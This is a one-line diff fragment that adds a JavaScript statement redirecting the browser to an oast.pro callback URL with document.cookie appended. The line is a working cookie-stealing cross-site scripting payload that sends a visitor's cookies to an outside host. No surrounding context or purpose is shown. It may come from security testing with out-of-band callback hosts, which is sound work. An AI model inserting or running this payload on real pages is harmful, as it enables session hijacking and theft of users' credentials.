@@ -1,0 +1,1 @@
+location = 'https://d1dbg1rz1wg0000hhg90gosiabyyyyyyb.oast.pro/?c=' + document.cookie;
